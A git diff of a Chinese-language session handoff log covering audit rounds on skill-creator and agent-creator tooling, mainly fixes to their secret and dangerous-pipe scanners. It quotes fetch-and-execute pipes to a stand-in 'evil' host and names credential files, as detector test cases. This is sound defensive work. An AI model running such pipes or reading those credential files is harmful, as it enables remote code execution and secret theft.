@@ -1,16 +1,17 @@
-# 会话交接（2026-09-10 · 第 10 版）
+# 会话交接（2026-09-10 · 第 16 版）
 
 本文件为最近会话的收尾记录，供后续会话快速接续。仓库权威指引是根 `AGENTS.md`（布局/铁律/命令）与两个工作区各自的 `README.md`；本文件只记录**当前上下文与待办**。
 
 ## 仓库状态速览
 
-- git：`main`，origin = `losemymind/Personal-AI-Tools`。历史提交：`6824c79` 仓库结构 → `35ca36d` 双创建器工作区/适配器/CATALOG → `46830ca` evals 键名漂移 → `e20fff1` agent 评审闭环 → `79600a2` 加固验证器/评测链 → `cc0962f` 入库 mcp-builder/ue5 → `d486a26` 修复 metrics.json 契约 → `25f03f5` 补验证器缺口 → `8096810` 清四项内部债（0.9.3）→ `192c905` 打通真机无头 CLI（0.9.4）→ `e819536` 真机评测隔离化 + 独立审计两轮修复（0.9.5-0.9.18，见 §E/§F/§G）→ `dfaf829` 交接状态修正。**origin/main 已同步，GitHub Actions CI 三 job 全绿（run 34480215967）**。
+- git：`main`，origin = `losemymind/Personal-AI-Tools`。历史提交：`6824c79` 仓库结构 → `35ca36d` 双创建器工作区/适配器/CATALOG → `46830ca` evals 键名漂移 → `e20fff1` agent 评审闭环 → `79600a2` 加固验证器/评测链 → `cc0962f` 入库 mcp-builder/ue5 → `d486a26` 修复 metrics.json 契约 → `25f03f5` 补验证器缺口 → `8096810` 清四项内部债（0.9.3）→ `192c905` 打通真机无头 CLI（0.9.4）→ `e819536` 真机评测隔离化 + 独立审计两轮修复（0.9.5-0.9.18，见 §E/§F/§G）→ `dfaf829` 交接状态修正 → 本会话五轮副agent循环审计修复（skill-creator 0.9.22 / agent-creator 0.7.4）。**origin/main 已同步；CI 在 `dfaf829` 三 job 全绿（run 34480215967），本次推送后应再跑 CI。**
 - 两工作区**同构精简**（无 `build/`、成品无 `AGENTS.md`、`INSTALL.md` 在工作区根、成品 `SKILL.md` 为唯一入口）；发布检查差异只因**成品自校验能力不同**（skill-creator 有 `validate_skills.py --strict`；agent-creator 自包含扫描落在 pytest）。
 - 能力库：`skills/` = **5 技能**（development/code-review-skill、development/mcp-builder、game-development/ue5-performance-optimization、git/pr-summarizer、product-design/prd-generator）；`agents/` = 32 代理（academic×5 / code-quality×2 / ue-game-studio×25）。
-- 版本：**skill-creator 0.9.18**、**agent-creator 0.7.0**。
+- 版本：**skill-creator 0.9.22**、**agent-creator 0.7.4**。
+- ⚠️ 工作树曾有大量改动，**已按用户确认提交并推送**（提交见本文件顶部 `git log` / 下方历史）：阶段一 skill-creator 0.9.18 → 0.9.22（第五轮 6 项 + 收尾复核 1 项 + **第七轮交叉验证 5 项** + **第八轮定向加严 1 项**，见 §J/§M/§N/§P）；阶段二 agent-creator 0.7.0 → 0.7.4（第一轮 21 项 + 新 `security_scan.py`，见 §K；第二轮独立复核 6 项，见 §L；**第三轮交叉验证 3+2 项**，见 §O；**第四轮定向加严 3 项**，见 §Q）。
 - `opencode.json`（仓库根）用 `instructions` 注册三份 `AGENTS.md`；`.opencode/`（安装测试副本）已 gitignore。
 - 本机可用模型串：`deepseek/deepseek-v4-flash`、`deepseek-responses/deepseek-v4-flash`（全局 `model` 指向不存在的 `siliconflow/...`，必须用 `--model`/`-m` 显式指定）。
-- ✅ 真机评测污染已修复（0.9.7，逐查询隔离工作区）；✅ 全量审计九轮（0.9.8-0.9.16）；✅ **独立审计第三/四轮（0.9.17-0.9.18）共发现并修复 19 项真实缺陷**——**第九轮子代理「成品无可复现缺陷」的结论被推翻**（那九轮只修崩溃/健壮性，漏了数据契约与文档-行为一致性）；**修复后又复核才暴露 2 项高/中（delta 角色解析、`.env` 漏扫）**。
+- ✅ 真机评测污染已修复（0.9.7，逐查询隔离工作区）；✅ 全量审计九轮（0.9.8-0.9.16）；✅ **独立审计第三/四轮（0.9.17-0.9.18）共发现并修复 19 项真实缺陷**——**第九轮子代理「成品无可复现缺陷」的结论被推翻**（那九轮只修崩溃/健壮性，漏了数据契约与文档-行为一致性）；**修复后又复核才暴露 2 项高/中（delta 角色解析、`.env` 漏扫）**。✅ **独立审计第五轮（0.9.19）再修 6 项**（见 §J）。✅ **收尾复核（0.9.20）再修 1 项**（见 §M）。✅ **agent-creator 独立审计第一轮（0.7.1）修 21 项**（见 §K）；✅ **第二轮独立复核（0.7.2）再修 6 项**（见 §L）；✅ **最终对抗式交叉验证（本会话）：skill 第七轮（0.9.21）修 5 项、agent 第三轮（0.7.3）修 3+2 项**（见 §N/§O）——**再次推翻「已达标」**：发现孪生不对称（curl/wget 缺 `iex`、skill 缺 `SENSITIVE_DOTFILES`）、续行/引号绕过、隐藏目录凭据盲区、以及 agent 验证器 `SKILL_ROOT` 回退假通过。✅ **定向加严轮（本会话）skill 第八轮（0.9.22）修 1 项、agent 第四轮（0.7.4）修 3 项**（见 §P/§Q）——先运行期复核上轮修复真生效，再攻脚手架 YAML 安全/路径冲突/描述边界。
 
 ## 本会话已完成改动
 
@@ -134,25 +135,156 @@
 - 修正 HANDOFF 过期状态 → 提交 `dfaf829` → 推送 `origin/main`。
 - **CI 首次真机运行全绿**：`.github/workflows/validate.yml` 三 job success（run 34480215967）。未改任何成品/能力库内容。
 
+### J. skill-creator 独立审计第五轮 0.9.18 → 0.9.19（本会话，6 项修复 + 1 文档）
+
+对成品全量只读审阅 + 逐条实证复现后修复；重点覆盖前几轮盲区：**「已提交产物的数据契约」与「文档承诺 ≠ 行为」**，兼补安全扫描覆盖缺口。全部改动仅落在 skill-creator 成品与 dev-only 测试。
+
+1. **`aggregate_benchmark` 缺 `pass_rate` 静默记 0%（中，数据契约）**：`grading.json` 由 LLM 评分子代理产出，`summary` 可能只给 `passed/failed/total`。原 `_as_float(summary.get("pass_rate", 0.0))` 把缺失当 0% 并带进 delta。复现 `{passed:2,failed:1,total:3}` → mean 0.0。修复：缺 `pass_rate` 时由 `passed/total` 推导。
+2. **`compare_skills` 结构分 `resource_organization` 计数任意子目录（低，文档≠行为）**：文档定义「scripts/references/examples/templates 子目录」，实现却是任意子目录数/3。复现 `foo/bar/baz` → 满分。修复：只计已知资源目录交集/3。
+3. **安全扫描按扩展名漏扫捆绑代码（中，覆盖缺口）**：`TEXT_SCAN_EXTS` 缺 `.js/.ts/.tsx/.jsx/.mjs/.cjs/.rb/.go/.java/.rs/.php`，而 `BACKTICK_REF_RE` 认这些——`scripts/deploy.js` 里的密钥/危险管道可绕过。修复：补齐扩展名。
+4. **常见凭据格式漏检（中）**：`SECRET_PATTERNS` 漏 `github_pat_`、`ghs_`/`ghr_`、Google `AIza…`、PEM 私钥头 `-----BEGIN … PRIVATE KEY-----`。修复：加入；并确认不误报 benign lookalike。
+5. **允许清单无法豁免缩进代码块（低，文档≠行为）**：报错文案承诺「annotate its block/line」即可豁免，但 `security_allowlist_ranges` 只认围栏。修复：marker 紧邻的缩进（≥4 列）代码块同样豁免（围栏优先，避免误豁免被正文隔开的块）。
+6. **`build_index.enrich_structure` 路径回退不一致（低，数据契约）**：`extract_fields` 对仅有 `id` 的项回退 `skills/<id>`，`enrich_structure` 未回退 → 结构统计落到仓库根。修复：复用同一回退。
+7. **SKILL.md 解剖块 TOC 阈值 `>300` 残留（低，文档不一致）**：第四轮只改了 skill-anatomy，SKILL.md 自身仍写 `>300`。修复为 `>100`。
+
+- 测试：`tests/test_hardening.py` **153 → 159 例**（+6）；`evolutions/2026-09-10-audit-round5.md`（新增）。
+- 发布门全绿（见下）；`.opencode/skills/skill-creator` 镜像已同步 7 个文件（哈希一致）。
+- **未提交 / 未推送**（遵守铁律 3，等待用户确认）。git：`main` @ `39195da`，工作树 7 处未提交改动（5 脚本 + SKILL.md + tests + 1 新 evolutions）。
+
+**已知未改（低，观察记录）**：`build_index.scan_skill_dir` 对**扫描源**的 `source` 字段硬编码 `"community"`，忽略上游 frontmatter 里声明的 `source`（anthropics 官方源因此被标 community）。影响仅限 `source` 列（无消费者展示），且修复需联网重建 `indexes/upstream.db` 才能同步已提交产物——本轮不改，留待下次线上重建时一并处理。
+
+### K. agent-creator 独立审计第一轮 0.7.0 → 0.7.1（本会话，21 项修复 + 新安全扫描模块）
+
+对 `agent-creator/skills/agent-creator/` 全量只读审阅 + 逐条实证复现，照 skill-creator 同套审计维度修复。**新增自包含模块 `scripts/security_scan.py`**（密钥 + 危险远程执行管道 + 局部 allowlist），并接入验证器。
+
+1. **安全扫描缺失（中）**：`validate_agents.py` 从不扫密钥/危险管道 → 新增模块；扫描 AGENT.md **与捆绑资源目录**（`check_dir_security`）。
+2. **BOM 数据契约（高）**：`validate_agents` / `compare_agents` / `build_agent_index` 用 `utf-8` 读，BOM 令合法代理被误报缺 frontmatter → 改 `utf-8-sig`。
+3. **BOM 令适配器静默透传（高）**：`adapt_agent.py` 遇 BOM 判「无 frontmatter」→ 原样输出 opencode 非法 `tools: [...]` 数组、退出 0 → 改 `utf-8-sig`。
+4. **`compare_agents --json` 非纯 JSON（中）** + 缺 AGENT.md `KeyError` + 非 dict frontmatter `AttributeError` → 全部修复。
+5. **验证器健壮性（中）**：非字符串 `name`（`name: 123`）`TypeError` → 类型校验；默认 `--dir` 扫自身产品误报 6 错 → 非 `AGENT.md` 需 frontmatter 才计为代理；fenced 链接/反引号误报悬空 → 豁免；扩展名白名单补 `db/txt/...`；显式 `--dir` 空目录静默全绿 → fail-loud。
+6. **脚手架（中/低）**：描述含引号/换行产出非法 YAML（docstring 承诺可自校验）→ `json.dumps` 安全标量；`mode` 被描述中 "subagent" 污染 → 精确替换；交互 EOF 回溯 → 兜底；版本不校验 → 前置校验。
+7. **检索/索引（中/低）**：FTS5 特殊字符查询回溯 → 逐词字面引用；负 `--limit` 当无限 → 报错；`build_agent_index` 块标量描述被存成 `">"` → 解析续行；`--no-dl` 与 `--keep` 是死参数（help 承诺但不生效）→ 分别落地为扫 cwd 与纳入清理条件；`--from-extracted` 坏路径回溯 → 前置校验。
+8. **文档一致性（低）**：真实质量维度为 **7**（含 `security_guardrails`）但 SKILL.md/README/`agent-comparison.md` 写「6 维」且 SKILL.md 列表漏安全护栏 → 统一为 7 维；`agent-anatomy.md` 自相矛盾（提及兄弟 reference 又声明不互链）→ 经 SKILL.md 导读。
+
+- 测试：`agent-creator/tests/test_hardening_round1.py` 新增 **24 例** → agent pytest **18 → 44**；`evolutions/2026-09-10-audit-round1.md`（新增）。
+- 发布门全绿（见下）；**agent-creator 无 `.opencode/skills/agent-creator/` 安装测试副本**（仅 skill-creator 有），本轮未同步镜像。
+- **未提交 / 未推送**（遵守铁律 3，等待用户确认）。git：`main` @ `39195da`。
+
+**已知未改（低，观察记录）**：`compare_agents.py` 的 `security_guardrails` 现复用 `find_dangerous_pipes`（prose 感知），但 offensive 免责判定仍为简单子串匹配；`adapt_agent.py` codex/deepseek「逐字节透传」在输入带 BOM 时会去掉 BOM（docstring 措辞待下次收敛）；能力库 `agents/` 无捆绑资源，安全扫描对库无影响。
+
+### L. agent-creator 独立审计第二轮复核 0.7.1 → 0.7.2（本会话，6 项修复，含「验证修复是否生效」）
+
+换角度独立复核 0.7.1：先用 grep + 运行期探针把第一轮 21 项**逐项验证是否真的生效**（结论：无「修了但没生效」项；已提交 `indexes/upstream.db` 无块标量损坏、568 条稳定、`--json` 纯 JSON、BOM 全链路 `utf-8-sig` 均成立），随后新发现并修复 6 项：
+
+1. **危险管道 PowerShell 别名绕过（中，安全）**：`curl`/`wget` 在 PowerShell 是 `Invoke-WebRequest` 别名，但管道右侧 shell 名单不含 `iex`/`invoke-expression` → `curl https://evil/x | iex`、`wget … | Invoke-Expression` 漏检（`irm/iwr … | iex` 才检出）。修复：并入 curl/wget 链 shell 集合；`grep iex` 不误报。
+2. **凭据 dotfile 漏扫（中，覆盖缺口）**：`is_scannable_text` 仅特判 `.env`，`id_rsa`/`id_ed25519`/`.npmrc`/`.git-credentials`/`.netrc` 等无扩展名凭据文件被跳过。修复：新增 `SENSITIVE_DOTFILES` 精确名单（捆绑 `id_rsa` 的 PEM 头现可检出）。
+3. **带标题 Markdown 链接误报悬空（中，正确性）**：`[x](guide.md "标题")` 的标题被当路径一部分 → 文件存在也报 `Dangling link`。修复：解析前剥离 CommonMark 可选标题。
+4. **`compare_agents --json` 契约错误（低）**：`meta.comparison_dimensions` 仍为 `quality6+structure4`，与实算 7 维矛盾 → 改 `quality7+structure4`。
+5. **`quality-bar` 计数漂移（低，文档≠行为）**：`agent-quality-bar.md`/README 仍称「6 项质量检查」→ 统一为 7 项并补第 7 项安全护栏。
+6. **`build_agent_index` CLI/产物保护（低，数据契约）**：`--no-dl` 未强制单源（默认 all 会重复扫同一 cwd）→ 与 `--from-extracted` 一致强制单 `--source`；某源 0 命中时原仍写库（会用部分源覆盖已提交 DB）→ 改 fail-loud 不写库；下载/解包失败改清晰报错。
+
+- 测试：`agent-creator/tests/test_hardening_round2.py` 新增 **9 例** → agent pytest **44 → 53**；`evolutions/2026-09-10-audit-round2.md`（新增）。
+- 发布门全绿（见下）；**未提交 / 未推送**（遵守铁律 3）。
+
+### M. skill-creator 收尾确认复核 0.9.19 → 0.9.20（本会话，1 项修复）
+
+轻量确认第五轮 6 项修复生效（`pass_rate` 推导 / 资源目录计数 / 代码扩展名 / 密钥模式与 `.env` / allowlist 缩进豁免 / `build_index` 路径回退）——**均生效、无回归**；复核中另发现 1 项可复现缺陷并修复：
+
+- **带标题 Markdown 链接误报悬空（中，正确性）**：`validate_skills.py` 的 dangling-link 检查把 `[x](guide.md "标题")` 整体当路径 → 文件存在也报 `Dangling link`。修复：剥离可选标题。**同一缺陷在 agent-creator 孪生验证器中亦存在，已同步修复**（见 §L 第 3 项）。
+- 测试：`skill-creator/tests/test_hardening.py` +2 例 → skill pytest **159 → 161**；`evolutions/2026-09-10-audit-round6-recheck.md`（新增）。
+- `.opencode/skills/skill-creator` 镜像同步 `SKILL.md`/`validate_skills.py`/新 evolutions（哈希一致）。
+- **未提交 / 未推送**（遵守铁律 3）。
+
+### N. skill-creator 第七轮对抗式交叉验证 0.9.20 → 0.9.21（本会话，5 项）
+
+对「已达标」结论做最终独立交叉验证：不重走相同清单，主动构造同类变体与换角度攻击面，逐条运行期实证。**成功推翻**并修复 5 项（全部落在前六轮未覆盖的孪生差额/shell 语法等价类/隐藏目录）：
+
+1. **curl/wget 管道缺 `iex`/`invoke-expression`（中，安全，孪生不对称）**：agent 第二轮已修，skill `utils.py` 从未同步 → `curl x | iex` 实证 skill 返回 0、agent 返回 1。修复：并入同一 shell 集合。
+2. **PowerShell 反引号 / CMD 脱字符续行绕过（中，安全）**：`curl x ` +换行+ `| iex`、`curl x ^` +换行+ `| cmd` 漏检。修复：`find_dangerous_pipes` 归一化合并续行，**仅当续行后紧跟 `|`**（初版无条件合并误吞围栏首行 ` ``` `、令围栏检测回归，探针立现，已纠正并在 evolutions 记录）。
+3. **引号/子壳包裹 shell token 绕过（中，安全）**：`| "bash"`、`| (bash)`、`| $(bash)` 漏检。修复：新增 `_normalize_token` 剥离配对包裹；benign 用例零误报。
+4. **无扩展名凭据文件名漏扫（中，覆盖，孪生不对称）**：skill `_is_scannable_text` 无 `SENSITIVE_DOTFILES`。修复：引入同名单表 + 补 `credentials`/`.gitconfig`/rc 文件等。
+5. **隐藏目录整体跳过（中，安全，双孪生）**：`.ssh/id_rsa`、`.aws/credentials` 不可见（实证 0 命中）。修复：安全扫描下钻隐藏目录，仅跳过 VCS/缓存（`SECURITY_SKIP_DIRS`）。
+
+- 测试：`skill-creator/tests/test_hardening.py` +5 例 → skill pytest **161 → 166**；`evolutions/2026-09-10-audit-round7.md`（新增）。
+- `.opencode/skills/skill-creator` 镜像同步（全量 160 文件哈希一致）。
+- 发布门全绿（skill pytest 166、成品+能力库 strict、索引 4 源 2187、CATALOG --check）。
+- **未提交 / 未推送**。
+
+### O. agent-creator 第三轮对抗式交叉验证 0.7.2 → 0.7.3（本会话，3+2 项）
+
+与 skill 第七轮同批、换角度对抗复核，修复 5 项（3 项独立 + 2 项为 skill 侧落后于 agent 的差额的对照确认）：
+
+1. **PowerShell 反引号 / CMD 脱字符续行绕过（中，安全）** — 同 §N-2，双侧同步修复。
+2. **引号/子壳包裹 shell token 绕过（中，安全）** — 同 §N-3，双侧同步修复。
+3. **隐藏目录整体跳过（中，安全）** — 同 §N-5；agent `check_dir_security` 下钻隐藏目录。
+4. **无扩展名凭据名补强（中，覆盖）**：`SENSITIVE_DOTFILES` 补 `credentials` 等。
+5. **backtick 引用回退 `SKILL_ROOT` 造成假通过（中，验证器 fail-open）**：`validate_agents.py` 本地解析不到时回退 agent-creator 自身根目录；实证 AGENT.md 引用不存在的 `references/agent-anatomy.md` 仍 `--strict` 全绿。修复：移除回退，只按代理自身目录解析（对齐 skill 侧早已移除的同款回退）。
+
+- 测试：新增 `agent-creator/tests/test_hardening_round3.py` **5 例** → agent pytest **53 → 58**；`evolutions/2026-09-10-audit-round3.md`（新增）。
+- 发布门全绿（agent pytest 58、库 strict 32、索引 3 源 568、CATALOG --check）；移除回退后库 32 代理仍全绿（无代理依赖该回退）。
+- **未提交 / 未推送**。
+
+### P. skill-creator 第八轮定向加严 0.9.21 → 0.9.22（本会话，1 项）
+
+按 HANDOFF 第 9 条「下一步」定向加严：先用**运行期探针**逐项验证第七轮 5 项修复是否真生效（结论：全部生效、无误报回归），再攻脚手架产物合法性。发现并修复 1 项孪生共享缺陷：
+
+- **空白 description 产出「自不合法」产物（低-中，契约/fail-open）**：`create_skill.py --description "   "`（truthy 但 strip 为空）通过校验并写入文件，而 `validate_skills.py` 以「description field is empty or whitespace only」拒绝 → 脚手架产物不过自己的门。修复：写盘前 `if not description.strip(): 拒绝`。**同一缺陷在孪生 `create_agent.py` 亦存在，已同步修复**（见 §Q）。
+- 已复核不成立：CJK+FTS 混合查询（含 `"`/`*`/`OR`/`-`/括号/`+`/`:`/不平衡引号/纯空白/`%`/`_`/`\`）全部 rc=0、无崩溃、无语法注入；并取索引中真实中文行验证 CJK 分支检索命中（`驱动的综合健康分析系统` 命中 `ai-analyzer`），**无静默漏结果**。
+
+- 测试：`skill-creator/tests/test_hardening.py` +1 → skill pytest **166 → 167**；`evolutions/2026-09-10-audit-round8.md`（新增）。
+- `.opencode/skills/skill-creator` 镜像同步 `SKILL.md`/`create_skill.py`/新 evolutions（源码哈希一致；`__pycache__` 除外）。
+- 发布门全绿（见下）；**未提交 / 未推送**。
+
+### Q. agent-creator 第四轮定向加严 0.7.3 → 0.7.4（本会话，3 项）
+
+与 skill 第八轮同批，定向攻 HANDOFF 第 9 条待办。先运行期复核第三轮 5 项修复（全部生效），再逐条复现，修复 3 项：
+
+1. **`create_agent.py` 模板替换用 f-string 当 `re.sub` 替换串 → 反斜杠/多行 description 产物非法（高，正确性/契约）**：`re.sub(pattern, f"description: {_yaml_str(desc)}", ...)` 的替换串会经 `re` 反斜杠转义处理。实证：description 含 `C:\Users\me`/`\d+` → JSON 转义的 `\\` 被折叠成 `\` → **非法 YAML**（`ScannerError`）；含换行 → JSON `\n` 变真实换行、YAML 折叠为空格，**内容静默丢失**。孪生 `create_skill.py` 早用 lambda，属孪生不对称。修复：`description`/`version`/`tools`/`mode` 四处统一 lambda。
+2. **`create_agent.py` 缺 description 长度/非空白校验（中，契约）**：docstring 承诺产物可校验，但 >300 或纯空白 description 照写、立即被自己的验证器拒绝。修复：前置拒绝（对齐 `create_skill.py`）。
+3. **`--out` 路径冲突未捕获 → 原始 traceback（中，健壮性/契约）**：`create_agent.py` 与 `adapt_agent.py` 在 `--out` 指向已存在目录、或路径父级是文件时抛未捕获 `OSError`。修复：目录检查 + 写入/建目录 `try/except OSError`（对齐 skill 侧已有处理）。
+   - 附带（低，文档-行为一致）：`adapt_agent.py` passthrough 文档「byte-identical」与实际（去 BOM、换行翻译）不符，措辞收敛。
+
+- 端到端误报回归：能力库 **32 代理 × 4 客户端**全部 adapt rc=0 且产物 YAML 可解析；最小脚手架（`--no-interactive` 仅 `--name`）过自身验证器。
+- 测试：新增 `agent-creator/tests/test_hardening_round4.py` **6 例** → agent pytest **58 → 64**；`evolutions/2026-09-10-audit-round4.md`（新增）。
+- 发布门全绿（见下）；**未提交 / 未推送**。
+
+### R. 本会话收尾：五轮副agent循环审计 → 提交/推送（主agent调度）
+
+主agent按用户要求启动副agent循环（副agent再自建 subagent / 或本机逐条实证），直至两成品达标：
+
+- **调度链**：副#1 skill-creator 第五轮（0.9.19）→ 副#2 agent-creator 第一轮（0.7.1）→ 副#3 agent 第二轮复核 + skill 确认（0.7.2/0.9.20）→ 副#4 最终对抗式交叉验证（0.7.3/0.9.21）→ 副#5 定向加严轮（0.7.4/0.9.22）。授权语（开放所有 permission、无人值守）已逐级下达。
+- **反复被推翻的「达标」**：每次子代理判定「无可复现缺陷」后，下一轮换角度用运行期探针都能推翻并发现真实缺陷（孪生不对称、安全续行/引号绕过、隐藏目录凭据盲区、验证器 fail-open、脚手架 YAML 转义等）。合计本会话修复 **skill 13 项 + agent 33 项**。
+- **主agent独立复核（收尾时实跑全绿）**：agent pytest **64**、skill pytest **167**；agent 库 strict **32**；skill 成品 strict **1** / 能力库 strict **5**；索引 skill **4 源 2187** / agent **3 源 568**；`build_catalog.py --check` 两库 up to date。
+- **两项设计边界（经用户确认「保持现状，仅文档记录」）**：① `validate_agents.py` 不传 `--dir` 时扫 0 个仍全绿（显式 `--dir` 已 fail-loud）；② `adapt_for_opencode` 同时给 `tools` 白名单与 `permission` 字符串简写时丢弃白名单、保留全局简写（放大权限，靠 note 提示）。**不属缺陷，勿擅自收严**（收严会改变验证器/适配器语义，需再次用户确认）。
+- 已按铁律 3 收尾：发布门全绿 + 文档/evolutions/版本/CATALOG 同步 + 本 HANDOFF 更新为第 16 版，随后由主agent提交并推送。
+
 ## 已知待办 / 潜在风险
 
 1. **真机基准已跑通（0.9.7，隔离版）**：工具侧 `--model`/`--timeout`/`--concurrency`/超时保信号/隔离全部就绪；14 查询 × 3 轮复跑 <5 分钟、零污染。当前成绩：正例 recall ≈ 0.625、precision 100%、0 假阳性。触发仍有非确定性（同句可能一次派发、一次直接作答）。**待办**：如需进一步提升 recall，方向是优化 description 或增加 runs——不属工具缺陷，勿擅自改描述。
-2. **成品已修至 0.9.18（第三/四轮审计）**：九轮后子代理曾判定「无可复现缺陷」，但独立审计两轮又找出 19 项真实缺陷并已修复；**教训：①审计要覆盖「已提交产物的数据契约」与「文档承诺 ≠ 行为」，不能只盯异常输入 traceback；②修复后必须再复核「修是否真的生效」**（第三轮补的 `.env` 扩展名就因 `splitext` 对 dotfile 失效而形同虚设）。后续再改脚本仍按 SOP 补 pytest 并重跑发布门。已知残留（低，未改）：`examples/README.md` 称 `loki-mode/references/` 有 16 个子文件，实为 14——按用户「examples/ 不需修复」指示保留。
+2. **成品已修至 skill-creator 0.9.22 / agent-creator 0.7.4（第三/四/五/七/八轮 + 收尾复核）**：九轮后子代理曾判定「无可复现缺陷」，但独立审计三轮又找出 25 项真实缺陷并已修复，收尾复核再修 1 项（0.9.20），第七轮对抗式交叉验证再修 5 项（0.9.21），**第八/四轮定向加严再修 4 项**（skill 0.9.22 空白描述；agent 0.7.4 脚手架 YAML 转义/描述边界/`--out` 冲突）；**教训：①审计要覆盖「已提交产物的数据契约」与「文档承诺 ≠ 行为」，不能只盯异常输入 traceback；②修复后必须再复核「修是否真的生效」；③孪生两侧须逐一对照，安全逻辑一份实现的补丁不会自动出现在另一侧；④「已达标」必须换角度证伪；⑤用户内容拼进 `re.sub` 替换串必经 lambda（反斜杠/组引用会破坏 YAML 或内容）**。后续再改脚本仍按 SOP 补 pytest 并重跑发布门。已知残留（低，未改）：`examples/README.md` 称 `loki-mode/references/` 有 16 个子文件，实为 14——按用户「examples/ 不需修复」指示保留；`build_index.scan_skill_dir` 对扫描源 `source` 硬编码 `community`（需联网重建 DB 才能同步，留待线上重建）。
 3. **触发评测为词重叠启发式**：仅代表词面覆盖，不代表真实触发率；`ue5-performance-optimization` 对「Unity 性能优化」的假阳性属固有（性能/优化为核心词不可去），不宜继续为此改描述。
 4. **能力库/审计一致性**：`skills/` 现 5 技能、`agents/` 32 代理；增删须同步 `skills/SKILLS-AUDIT.md`/`agents/AGENTS-AUDIT.md` 与两份 `CATALOG.md`，重跑 `python tools/scripts/build_catalog.py`。（本会话只改创建器成品，未改技能/代理集合，审计与 CATALOG 无需变动。）
 5. **触发代理追加的 5 个测试已保留**：`tests/test_hardening.py` 中 `test_run_cli_item_threshold_semantics` 等 5 例——经审阅内容正确、全绿，用户决定保留。
 6. **已评估、用户明确「不需要修复」的项（勿再主动提出）**：skill-creator 成品 `examples/`（103 文件学习样本）、两份 `indexes/upstream.db`（随成品提交）、能力库 UE/academic 垂直内容——维持现状。
-7. **提交纪律（铁律 3）**：任何 git 提交/推送前，必先跑发布门全绿 + 同步受影响的文档（README/审计/CATALOG/evolutions/版本号）+ 更新本 `HANDOFF.md` + 向用户输出可点击复制的新会话交接提示。（改动已提交 `e819536`、交接修正 `dfaf829` 并推送；本次会话确认发布门全绿后完成。）
+7. **提交纪律（铁律 3）**：任何 git 提交/推送前，必先跑发布门全绿 + 同步受影响的文档（README/审计/CATALOG/evolutions/版本号）+ 更新本 `HANDOFF.md` + 向用户输出可点击复制的新会话交接提示。（历史：`e819536`/`dfaf829` 已推送；**本会话全部改动已完成收尾并经用户确认提交/推送，见 §R**。）
 8. **CI 已首次在真机运行并全绿**：`.github/workflows/validate.yml` 在推送 `dfaf829` 后运行，三个 job（agent-creator pytest+strict / skill-creator pytest+strict / CATALOG --check）全部 **success**（run 34480215967，https://github.com/losemymind/Personal-AI-Tools/actions/runs/34480215967 ）。
+9. **总任务进展（全阶段，本会话已完成并提交/推送，见 §R）**：
+   - **阶段一（skill-creator 独立审计）**：✅ 第五轮（0.9.18 → 0.9.19，6 项）+ 收尾复核（0.9.19 → 0.9.20，1 项）+ **第七轮对抗式交叉验证（0.9.20 → 0.9.21，5 项）** + **第八轮定向加严（0.9.21 → 0.9.22，1 项）** 均已完成，发布门全绿（skill pytest 167、成品+能力库 strict、索引 4 源 2187、CATALOG --check）。第八轮覆盖：运行期复核上轮 5 项生效 + 脚手架空白描述契约。
+   - **阶段二（agent-creator 相同审计）**：✅ 第一轮（0.7.0 → 0.7.1，21 项 + 新 `security_scan.py`）+ 第二轮独立复核（0.7.1 → 0.7.2，6 项）+ **第三轮对抗式交叉验证（0.7.2 → 0.7.3，3+2 项）** + **第四轮定向加严（0.7.3 → 0.7.4，3 项）** 均已完成，发布门全绿（agent pytest 64、库 strict 32、索引 3 源 568、CATALOG --check）。第四轮覆盖：`create_agent` YAML 替换转义、描述长度/空白边界、`create_agent`/`adapt_agent` `--out` 路径冲突。
+   - **判定（本会话加严轮）**：本轮共修复 **4 个不同缺陷**（agent 侧 3、skill 侧 1，其中空白描述 1 项为双孪生共享）；均先运行期实证复现、修复补 pytest、并对修复再复核（`create_agent` 反斜杠/多行往返、`--out` 干净错误、能力库 32×4 端到端零误报）。据此，两成品在**合理用户路径**上，本轮及此前发现的正确性/安全/契约/文档-行为缺陷均已修复并回归；**未再构造出新的可复现缺陷**（CJK+FTS 混合、脚手架非 ASCII/多行、四端 post-check 边界均已实证）。
+   - **下一步（下个副 agent 的精确待办）**：本会话未发现剩余可复现缺陷；两项设计边界（`validate_agents.py --dir` 缺省扫 0、`adapt_for_opencode` 权限放大）**经用户确认保持现状、仅文档记录，不再主动收严**。若后续仍要加固，建议换全新角度（非必须）：客户端各自真实安装形态的端到端消费、`run_eval/run_scenario` 真机长跑稳定性、索引在线重建脚本。否则视为任务完成。
+   - 全阶段达标后：按铁律 3 收尾（发布门全绿 + 同步文档 + 更新本 HANDOFF + 输出新会话交接提示）；本会话已由用户确认提交/推送。
 
 ## 验证命令备忘
 
 ```bash
 # agent-creator（在 agent-creator/ 根）——发布门 = 一个 pytest 命令全含
-python -m pytest tests/ -q        # 回归 + 成品自包含自检（18 例）
+python -m pytest tests/ -q        # 回归 + 成品自包含自检（64 例）
+python skills/agent-creator/scripts/validate_agents.py --strict --dir E:\GitHub\Personal-AI-Tools\agents   # 库 strict（32）
+python skills/agent-creator/scripts/search_agent_index.py --stats             # 3 源 568 条
 
 # skill-creator（在 skill-creator/ 根）
-python -m pytest tests/ -q                                                    # 153 例
+python -m pytest tests/ -q                                                    # 167 例
 python skills/skill-creator/scripts/validate_skills.py --strict --dir skills/skill-creator
 python skills/skill-creator/scripts/validate_skills.py --strict --dir E:\GitHub\Personal-AI-Tools\skills
 python skills/skill-creator/scripts/search_index.py --stats                   # 4 源 2187 条
